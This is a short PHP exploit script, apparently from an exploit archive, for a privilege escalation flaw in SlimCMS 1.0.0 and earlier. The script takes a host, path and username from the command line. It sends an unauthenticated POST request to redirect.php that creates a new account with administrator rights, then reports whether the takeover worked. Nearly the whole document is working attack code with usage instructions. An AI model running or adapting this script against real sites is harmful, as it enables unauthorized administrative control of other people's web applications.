#!/usr/bin/php -q
&lt;?php

/*
   SlimCMS &lt;= 1.0.0 Privilege Escalation Exploit
   Discovered By StAkeR aka athos - StAkeR[at]hotmail[dot]it
   Discovered On 11/10/2008
   http://downloads.sourceforge.net/slimcms/SlimCMS-1.0.0.tgz?modtime=1217343227&amp;big_mirror=0
*/


error_reporting(0);

$host = $argv[1];
$host = str_replace(&#039;http://&#039;,NULL,$host);
$path = $argv[2].&quot;/redirect.php&quot;;
$user = $argv[3];

if(!preg_match(&#039;/http:\/\/(.+?)$/&#039;,$host) and strlen($user) &lt; 5)
{
  echo &quot;[?] Usage: php $argv[0][host][path][username]\r\n&quot;;
  echo &quot;[?] Usage: php $argv[0] http://localhost /cms milw0rm\r\n&quot;;
  exit;
}

if(!$sock = fsockopen($host,80)) 
{
  die(&quot;Socket Error\r\n&quot;);
}

$post .= &quot;newusername=$user&amp;newpassword=$user&amp;newisadmin=1&quot;;
$data .= &quot;POST /$path HTTP/1.1\r\n&quot;;
$data .= &quot;Host: $host\r\n&quot;;
$data .= &quot;User-Agent: Mozilla/4.5 [en] (Win95; U)\r\n&quot;;
$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$data .= &quot;Content-Length: &quot;.strlen($post).&quot;\r\n&quot;;
$data .= &quot;Connection: close\r\n\r\n&quot;;
$data .= &quot;$post\r\n\r\n&quot;;

fputs($sock,$data);

while(!feof($sock)) 
{
  $content .= fgets($sock);
} fclose($sock); 

if(eregi(&#039;change.php&#039;,$content))
{
  echo &quot;[?] Added New Administrator!\r\n&quot;;
  echo &quot;[?] Username and Password: $user\r\n&quot;;
  exit;
}
else
{
  echo &quot;[?] Exploit Failed!\n&quot;;
}


?&gt;



